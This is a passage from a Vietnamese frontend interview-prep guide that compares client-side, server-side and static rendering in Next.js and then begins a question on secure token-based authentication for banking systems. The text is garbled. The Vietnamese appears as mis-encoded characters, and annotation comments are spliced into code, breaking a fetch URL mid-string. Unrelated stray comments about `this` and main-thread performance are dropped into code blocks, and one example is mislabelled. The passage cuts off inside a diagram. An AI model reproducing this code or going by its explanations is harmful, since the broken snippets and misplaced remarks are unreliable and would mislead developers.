 // Ch√∫ gi·∫£i: 4. JavaScript hydrates in background
 // Ch√∫ gi·∫£i: 5. Page becomes interactive (2-3s total)

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: HTML sent to browser (Full content!):
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: <!DOCTYPE html>
 // Ch√∫ gi·∫£i: <html>
 // Ch√∫ gi·∫£i: <head>
 // Ch√∫ gi·∫£i: <title>My App</title>
 // Ch√∫ gi·∫£i: </head>
 // Ch√∫ gi·∫£i: <body>
 // Ch√∫ gi·∫£i: <div id="__next">
 // Ch√∫ gi·∫£i: <div>
 // Ch√∫ gi·∫£i: <h1>Users</h1>
 // Ch√∫ gi·∫£i: <ul>
 // Ch√∫ gi·∫£i: <li>John Doe - john@example.com</li>
 // Ch√∫ gi·∫£i: <li>Jane Smith - jane@example.com</li>
 // Ch√∫ gi·∫£i: <!-- Full content already rendered! -->
 // Ch√∫ gi·∫£i: </ul>
 // Ch√∫ gi·∫£i: </div>
 // Ch√∫ gi·∫£i: </div>
 // Ch√∫ gi·∫£i: <script src="/_next/static/bundle.js"></script>
 // Ch√∫ gi·∫£i: </body>
 // Ch√∫ gi·∫£i: </html>
```

---

#### **üìä So S√°nh Chi Ti·∫øt CSR vs SSR**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Ti√™u Ch√≠             ‚îÇ CSR (Client-Side)        ‚îÇ SSR (Server-Side)        ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Initial Load         ‚îÇ ‚ùå 3-5 seconds           ‚îÇ ‚úÖ 0.5-1 second          ‚îÇ
‚îÇ Time to Interactive  ‚îÇ ‚úÖ 3-5 seconds           ‚îÇ ‚ö†Ô∏è  2-3 seconds          ‚îÇ
‚îÇ SEO                  ‚îÇ ‚ùå Poor (empty HTML)     ‚îÇ ‚úÖ Excellent (full HTML) ‚îÇ
‚îÇ Server Load          ‚îÇ ‚úÖ Low (serve static)    ‚îÇ ‚ùå High (render per req) ‚îÇ
‚îÇ Complexity           ‚îÇ ‚úÖ Simple                ‚îÇ ‚ùå Complex               ‚îÇ
‚îÇ Navigation Speed     ‚îÇ ‚úÖ Instant               ‚îÇ ‚ö†Ô∏è  Slower (re-render)   ‚îÇ
‚îÇ Bundle Size          ‚îÇ ‚ùå Large (500KB-2MB)     ‚îÇ ‚ö†Ô∏è  Medium (same JS)     ‚îÇ
‚îÇ Blank Screen         ‚îÇ ‚ùå Yes (before hydrate)  ‚îÇ ‚úÖ No (HTML ready)       ‚îÇ
‚îÇ API Calls            ‚îÇ ‚ùå Client (slow)         ‚îÇ ‚úÖ Server (fast)         ‚îÇ
‚îÇ Caching              ‚îÇ ‚úÖ Easy (CDN)            ‚îÇ ‚ö†Ô∏è  Complex (per-user)   ‚îÇ
‚îÇ Cost                 ‚îÇ ‚úÖ Low (CDN only)        ‚îÇ ‚ùå High (servers)        ‚îÇ
‚îÇ User Experience      ‚îÇ ‚ö†Ô∏è  Initial: Poor        ‚îÇ ‚úÖ Initial: Great        ‚îÇ
‚îÇ                      ‚îÇ ‚úÖ After load: Great     ‚îÇ ‚ö†Ô∏è  Navigation: OK       ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

#### **üéØ Use Cases - Khi N√†o D√πng CSR vs SSR?**

**‚úÖ D√πng CSR khi:**

```typescript
 // Ch√∫ gi·∫£i: 1. Admin Dashboard / Internal Tools
// - Kh√¥ng c·∫ßn SEO
// - User ƒë√£ logged in
 // Ch√∫ gi·∫£i: - Rich interactions
 // Ch√∫ gi·∫£i: - Example: Analytics dashboard, CRM

 // Ch√∫ gi·∫£i: 2. SPAs with Auth
 // Ch√∫ gi·∫£i: - Dashboard, Settings
 // Ch√∫ gi·∫£i: - User profile pages
 // Ch√∫ gi·∫£i: - Tools, calculators

 // Ch√∫ gi·∫£i: 3. Highly Interactive Apps
 // Ch√∫ gi·∫£i: - Drawing apps
 // Ch√∫ gi·∫£i: - Games
 // Ch√∫ gi·∫£i: - Real-time collaboration tools

 // Ch√∫ gi·∫£i: Example:
const AdminDashboard = () => {
  return (
    <div>
      <Chart data={realtimeData} /> {/* Real-time updates */}
      <DataGrid onEdit={handleEdit} /> {/* Complex interactions */}
    </div>
  );
};
```

**‚úÖ D√πng SSR khi:**

```typescript
 // Ch√∫ gi·∫£i: 1. Public Content / Marketing
 // Ch√∫ gi·∫£i: - Landing pages
 // Ch√∫ gi·∫£i: - Blogs, News
 // Ch√∫ gi·∫£i: - E-commerce product pages
 // Ch√∫ gi·∫£i: - Example: Company website, Blog

 // Ch√∫ gi·∫£i: 2. SEO-Critical Pages
 // Ch√∫ gi·∫£i: - Product listings
 // Ch√∫ gi·∫£i: - Article pages
 // Ch√∫ gi·∫£i: - Search result pages

 // Ch√∫ gi·∫£i: 3. Dynamic Content
 // Ch√∫ gi·∫£i: - Personalized homepages
 // Ch√∫ gi·∫£i: - Location-based content
 // Ch√∫ gi·∫£i: - User-specific dashboards

 // Ch√∫ gi·∫£i: Example:
export const getServerSideProps = async (context) => {
 // Ch√∫ gi·∫£i: Fetch based on user location
  const { country } = context.req.geo;
  const products = await fetchProductsByCountry(country);

  return { props: { products } };
};

const ProductPage = ({ products }) => {
  return (
    <div>
      <h1>Products in Your Region</h1>
      {products.map((p) => (
        <ProductCard key={p.id} {...p} />
      ))}
    </div>
  );
};
```

---

#### **‚ö° Hybrid Approach - Static Site Generation (SSG)**

Next.js c√≤n c√≥ SSG (Static Site Generation) - best of both worlds:

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: SSG Example - Next.js
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: Build time: Generate static HTML
export const getStaticProps: GetStaticProps = async () => {
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
  const res = await fetch('https: // Ch√∫ gi·∫£i: api.example.com/posts');
  const posts = await res.json();

  return {
    props: { posts },
    revalidate: 60, // Ch√∫ gi·∫£i: Re-generate every 60 seconds (ISR)
  };
};

 // Ch√∫ gi·∫£i: Component
const BlogPage = ({ posts }) => {
  return (
    <div>
      <h1>Blog Posts</h1>
      {posts.map((post) => (
        <article key={post.id}>
          <h2>{post.title}</h2>
          <p>{post.excerpt}</p>
        </article>
      ))}
    </div>
  );
};

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: Benefits:
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: ‚úÖ Fast as CSR (served from CDN)
 // Ch√∫ gi·∫£i: ‚úÖ SEO-friendly like SSR
 // Ch√∫ gi·∫£i: ‚úÖ No server rendering cost
 // Ch√∫ gi·∫£i: ‚úÖ ISR (Incremental Static Regeneration)

 // Ch√∫ gi·∫£i: Timeline:
 // Ch√∫ gi·∫£i: [Build] Generate HTML ‚Üí Deploy to CDN
 // Ch√∫ gi·∫£i: ‚Üì
 // Ch√∫ gi·∫£i: [Request] CDN ‚Üí Browser (instant!)
 // Ch√∫ gi·∫£i: ‚Üì
 // Ch√∫ gi·∫£i: [Background] Re-validate every 60s
```

---

#### **üìã Best Practices**

**1. CSR Optimization:**

```typescript
 // Ch√∫ gi·∫£i: ‚úÖ Code splitting
import { lazy, Suspense } from 'react';

const HeavyComponent = lazy(() => import('./HeavyComponent'));

function App() {
  return (
    <Suspense fallback={<Loading />}>
      <HeavyComponent />
    </Suspense>
  );
}

 // Ch√∫ gi·∫£i: ‚úÖ Preload critical data
<link rel="preload" href="/api/users" as="fetch" crossOrigin="anonymous" />

 // Ch√∫ gi·∫£i: ‚úÖ Service Worker caching
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js');
}
```

**2. SSR Optimization:**

```typescript
 // Ch√∫ gi·∫£i: ‚úÖ Cache rendered pages
import { NextResponse } from 'next/server';

export async function middleware(request) {
  const response = NextResponse.next();
  response.headers.set('Cache-Control', 'public, max-age=60, stale-while-revalidate=120');
  return response;
}

 // Ch√∫ gi·∫£i: ‚úÖ Streaming SSR (React 18)
import { renderToReadableStream } from 'react-dom/server';

const stream = await renderToReadableStream(<App />);
return new Response(stream);

 // Ch√∫ gi·∫£i: ‚úÖ Selective hydration
<div suppressHydrationWarning>{serverOnlyContent}</div>
```

**3. Hybrid Strategy:**

```typescript
 // Ch√∫ gi·∫£i: ‚úÖ Mix CSR + SSR + SSG
 // Ch√∫ gi·∫£i: - SSG: Static pages (blog, docs)
 // Ch√∫ gi·∫£i: - SSR: Dynamic pages (user profile)
 // Ch√∫ gi·∫£i: - CSR: Interactive parts (comments, likes)

 // Ch√∫ gi·∫£i: pages/post/[id].tsx
export const getStaticProps = async ({ params }) => {
  const post = await fetchPost(params.id); // Ch√∫ gi·∫£i: SSG
  return { props: { post } };
};

const PostPage = ({ post }) => {
  return (
    <div>
      {/* SSG content */}
      <article>{post.content}</article>

      {/* CSR interactive part */}
      <Comments postId={post.id} />
      <LikeButton postId={post.id} />
    </div>
  );
};
```

---

#### **üîç Debugging & Measuring**

```typescript
 // Ch√∫ gi·∫£i: 1. Measure Time to First Byte (TTFB)
performance.getEntriesByType('navigation')[0].responseStart;

 // Ch√∫ gi·∫£i: 2. Measure First Contentful Paint (FCP)
new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    console.log('FCP:', entry.startTime);
  }
}).observe({ entryTypes: ['paint'] });

 // Ch√∫ gi·∫£i: 3. Detect SSR vs CSR
const isSSR = typeof window === 'undefined';
console.log('Rendering on:', isSSR ? 'Server' : 'Client');

 // Ch√∫ gi·∫£i: 4. Chrome DevTools
 // Ch√∫ gi·∫£i: - Network tab: Check HTML size (SSR = large, CSR = small)
 // Hi·ªáu su·∫•t: tr√°nh ch·∫∑n main thread; d√πng Web Worker, chia nh·ªè t√°c v·ª•, t·ªëi ∆∞u reflow/repaint.
 // Ch√∫ gi·∫£i: - Lighthouse: Run audit for SSR vs CSR
```

---

#### **‚ùå Common Mistakes**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå MISTAKE 1: Using window/document in SSR
function MyComponent() {
  const width = window.innerWidth; // Ch√∫ gi·∫£i: ‚ùå Error: window is not defined
  return <div style={{ width }}></div>;
}

 // Ch√∫ gi·∫£i: ‚úÖ FIX: Check environment
function MyComponent() {
  const [width, setWidth] = useState(0);

  useEffect(() => {
    if (typeof window !== 'undefined') {
      setWidth(window.innerWidth);
    }
  }, []);

  return <div style={{ width }}></div>;
}

 // Ch√∫ gi·∫£i: ‚ùå MISTAKE 2: Fetching data in useEffect for SSR
export default function Page() {
  const [data, setData] = useState(null);

  useEffect(() => {
    fetch('/api/data').then(/* ... */); // Ch√∫ gi·∫£i: ‚ùå Runs on client!
  }, []);

  return <div>{data?.title}</div>;
}

 // Ch√∫ gi·∫£i: ‚úÖ FIX: Use getServerSideProps
export const getServerSideProps = async () => {
  const data = await fetch('/api/data').then((r) => r.json());
  return { props: { data } };
};

export default function Page({ data }) {
  return <div>{data.title}</div>; // Ch√∫ gi·∫£i: ‚úÖ Data already available
}

 // Ch√∫ gi·∫£i: ‚ùå MISTAKE 3: Over-using SSR
 // Ch√∫ gi·∫£i: Don't SSR everything - mix strategies!

 // Ch√∫ gi·∫£i: ‚úÖ GOOD: Strategic mix
 // Ch√∫ gi·∫£i: - SSG: Blog posts, docs (static)
 // Ch√∫ gi·∫£i: - SSR: User dashboard (dynamic)
 // Ch√∫ gi·∫£i: - CSR: Admin panel (no SEO needed)
```

---

#### **üìä Real-world Performance Comparison**

```typescript
 // Ch√∫ gi·∫£i: Example: E-commerce Product Page

 // Ch√∫ gi·∫£i: CSR (Create React App):
 // Ch√∫ gi·∫£i: - Initial Load: 3.5 seconds
 // Ch√∫ gi·∫£i: - Time to Interactive: 3.5 seconds
 // Ch√∫ gi·∫£i: - Lighthouse Score: 40/100
 // Ch√∫ gi·∫£i: - SEO: ‚ùå Poor (Google sees empty HTML)

 // Ch√∫ gi·∫£i: SSR (Next.js):
 // Ch√∫ gi·∫£i: - Initial Load: 1.2 seconds
 // Ch√∫ gi·∫£i: - Time to Interactive: 2.8 seconds
 // Ch√∫ gi·∫£i: - Lighthouse Score: 85/100
 // Ch√∫ gi·∫£i: - SEO: ‚úÖ Excellent (Google sees full content)

 // Ch√∫ gi·∫£i: SSG (Next.js ISR):
 // Ch√∫ gi·∫£i: - Initial Load: 0.5 seconds (CDN)
 // Ch√∫ gi·∫£i: - Time to Interactive: 1.8 seconds
 // Ch√∫ gi·∫£i: - Lighthouse Score: 95/100
 // Ch√∫ gi·∫£i: - SEO: ‚úÖ Excellent + fast delivery
```

---

#### **üéØ Decision Tree**

```
Start
  ‚Üì
SEO needed?
  ‚îú‚îÄ No ‚Üí CSR (React, Vue, Angular SPA)
  ‚îÇ
  ‚îî‚îÄ Yes ‚Üí Content changes frequently?
           ‚îú‚îÄ No ‚Üí SSG (Next.js, Gatsby)
           ‚îÇ        - Blog, docs, marketing
           ‚îÇ
           ‚îî‚îÄ Yes ‚Üí Per-user content?
                    ‚îú‚îÄ No ‚Üí SSR with cache
                    ‚îÇ        - News, products
                    ‚îÇ
                    ‚îî‚îÄ Yes ‚Üí SSR + ISR
                             - User dashboards
                             - Personalized pages
```

---

#### **üí° Summary**

**CSR (Client-Side Rendering):**

- ‚úÖ Best for: SPAs, admin tools, internal apps
- ‚úÖ Pros: Simple, fast navigation, low server cost
- ‚ùå Cons: Slow initial load, poor SEO, blank screen

**SSR (Server-Side Rendering):**

- ‚úÖ Best for: Public pages, SEO-critical, e-commerce
- ‚úÖ Pros: Fast initial load, SEO-friendly, no blank screen
- ‚ùå Cons: High server cost, complex, slower navigation

**SSG (Static Site Generation):**

- ‚úÖ Best for: Blogs, docs, marketing pages
- ‚úÖ Pros: Fastest, SEO-friendly, low cost (CDN)
- ‚ùå Cons: Stale data (solved with ISR)

**Modern Approach:**

```typescript
 // Ch√∫ gi·∫£i: Mix all three strategies!
 // Ch√∫ gi·∫£i: - SSG for static pages (blog, docs)
 // Ch√∫ gi·∫£i: - SSR for dynamic pages (user profile, search)
 // Ch√∫ gi·∫£i: - CSR for interactive parts (comments, likes)

 // Ch√∫ gi·∫£i: Example: E-commerce site
 // Ch√∫ gi·∫£i: - Homepage: SSG (revalidate hourly)
 // Ch√∫ gi·∫£i: - Product page: SSR (real-time inventory)
 // Ch√∫ gi·∫£i: - Cart: CSR (no SEO needed)
 // Ch√∫ gi·∫£i: - Checkout: SSR (security + UX)
```

**Key Takeaway:**

- There's NO "best" approach - choose based on requirements
- Modern frameworks (Next.js, Remix) support all strategies
- Measure with real data: TTFB, FCP, TTI, Lighthouse
- SEO + Performance = SSR/SSG
- Interactivity + Simple = CSR


```
üíß Hydration l√† qu√° tr√¨nh Server render ra HTML ‚Üí Browser hi·ªÉn th·ªã ngay ‚Üí Sau ƒë√≥ React ‚Äúg·∫Øn‚Äù event listeners v√†o HTML ‚Üí UI tr·ªü n√™n t∆∞∆°ng t√°c ƒë∆∞·ª£c.

"Hydration l√† b∆∞·ªõc React bi·∫øn HTML do SSR ho·∫∑c SSG render s·∫µn th√†nh UI c√≥ th·ªÉ t∆∞∆°ng t√°c, b·∫±ng c√°ch attach event listeners v√† kh√¥i ph·ª•c state.

HTML t·ª´ server ngay l·∫≠p t·ª©c gi√∫p c·∫£i thi·ªán SEO v√† First Contentful Paint, c√≤n hydration gi√∫p UI ho·∫°t ƒë·ªông nh∆∞ SPA. Th√°ch th·ª©c l·ªõn nh·∫•t l√† tr√°nh hydration mismatch v√† t·ªëi ∆∞u cost hydration trong c√°c trang l·ªõn b·∫±ng techniques nh∆∞ partial/lazy hydration.
```
---
## 43. üé´ Q43: Authentication Flow An To√†n Cho H·ªá Th·ªëng Ng√¢n H√†ng/Ch·ª©ng Kho√°n - Access Token, Refresh Token, Cookie Security  

**P1: T√™n c√¢u h·ªèi:** üé´ Q43: Authentication Flow An To√†n Cho H·ªá Th·ªëng Ng√¢n H√†ng/Ch·ª©ng Kho√°n - Access Token, Refresh Token, Cookie Security  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (4-5 ph√∫t):**

**"Secure auth flow: Access Token (short-lived, 15min, memory) + Refresh Token (long-lived, 7-30 days, httpOnly cookie). Implement token rotation, XSS/CSRF protection, MFA cho high-security systems."**

**üîë Architecture - Dual Token Pattern:**

**1. Access Token (JWT):**
- **Th·ªùi h·∫°n**: 15 ph√∫t (ng·∫Øn - limit damage n·∫øu stolen)
- **L∆∞u ·ªü**: Memory (JS variable) - KH√îNG localStorage (XSS vulnerable)
- **D√πng ƒë·ªÉ**: API calls - `Authorization: Bearer <token>`
- **M·∫•t khi**: Refresh page ‚Üí l·∫•y l·∫°i t·ª´ refresh token

**2. Refresh Token:**
- **Th·ªùi h·∫°n**: 7-30 ng√†y (d√†i - UX t·ªët)
- **L∆∞u ·ªü**: **httpOnly Cookie** - JS kh√¥ng ƒë·ªçc ƒë∆∞·ª£c (ch·ªëng XSS)
- **Flags**: `Secure` (HTTPS only), `SameSite=Strict` (ch·ªëng CSRF)
- **D√πng ƒë·ªÉ**: L·∫•y access token m·ªõi khi expired

**3. Authentication Flow:**
```
Login ‚Üí Server return:
  - Access Token (response body)
  - Refresh Token (httpOnly cookie)
‚Üí Client l∆∞u access token in memory
‚Üí API calls v·ªõi access token
‚Üí Token expired (15min) ‚Üí call /refresh endpoint
‚Üí Server verify refresh token (cookie) ‚Üí return new access token
```

**4. Security Measures:**
- **Token Rotation**: Refresh token thay ƒë·ªïi m·ªói l·∫ßn d√πng (detect stolen tokens)
- **Token Blacklist**: Revoke tokens khi logout/suspicious activity
- **MFA**: 2FA/OTP cho sensitive operations (transfer, withdraw)
- **Device fingerprinting**: Detect unusual login locations
- **Rate limiting**: Max 5 failed attempts ‚Üí lock account 30min

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- L∆∞u tokens trong localStorage ‚Üí **XSS steal tokens**
- Kh√¥ng rotate refresh tokens ‚Üí stolen token d√πng m√£i
- CORS misconfiguration ‚Üí expose tokens cross-origin
- Kh√¥ng implement CSRF tokens ‚Üí cross-site request attacks

**üí° Ki·∫øn Th·ª©c Senior:**
- **JWT structure**: Header.Payload.Signature (Base64URL encoded)
- **Signature algorithms**: HS256 (symmetric, shared secret) vs **RS256** (asymmetric, safer - banking)
- **Silent refresh**: Background refresh tr∆∞·ªõc khi expired (smooth UX)
- **Token introspection**: Server-side validation cho high-security (kh√¥ng tin client JWT)
- **OAuth 2.0 + PKCE**: Authorization Code Flow v·ªõi Proof Key (mobile apps)

**Tr·∫£ l·ªùi:**

H·ªá th·ªëng authentication cho ng√¢n h√†ng/ch·ª©ng kho√°n y√™u c·∫ßu **b·∫£o m·∫≠t c·ª±c k·ª≥ cao** v√¨ li√™n quan ƒë·∫øn ti·ªÅn b·∫°c v√† th√¥ng tin nh·∫°y c·∫£m. Flow chu·∫©n s·ª≠ d·ª•ng **JWT (JSON Web Token)** v·ªõi **Access Token + Refresh Token** k·∫øt h·ª£p **httpOnly Cookie**.

#### **üìä T·ªïng Quan Authentication Flow**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ              SECURE AUTHENTICATION FLOW                            ‚îÇ
‚îÇ        (Banking/Trading System - H·ªá Th·ªëng Ng√¢n H√†ng)              ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                                    ‚îÇ
‚îÇ  üîë ACCESS TOKEN                                                   ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Th·ªùi h·∫°n: 15 ph√∫t (ng·∫Øn)                                   ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ L∆∞u ·ªü: Memory (JavaScript variable)                       ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ D√πng ƒë·ªÉ: G·ªçi API (Authorization: Bearer <token>)          ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ M·∫•t khi: Refresh page (ph·∫£i l·∫•y l·∫°i)                      ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ B·∫£o m·∫≠t: Kh√¥ng l∆∞u localStorage (XSS risk)                ‚îÇ ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ
‚îÇ                                                                    ‚îÇ
‚îÇ  üîÑ REFRESH TOKEN                                                  ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Th·ªùi h·∫°n: 7-30 ng√†y (d√†i)                                  ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ L∆∞u ·ªü: httpOnly Cookie (server-side ch·ªâ ƒë·ªçc ƒë∆∞·ª£c)         ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ D√πng ƒë·ªÉ: L·∫•y Access Token m·ªõi khi h·∫øt h·∫°n                 ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ B·∫£o m·∫≠t: httpOnly + Secure + SameSite=Strict              ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Kh√¥ng ƒë·ªçc ƒë∆∞·ª£c b·ªüi JavaScript (ch·ªëng XSS)                 ‚îÇ ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ
‚îÇ                                                                    ‚îÇ
‚îÇ  üç™ SESSION COOKIE (Optional - cho Banking)                       ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ
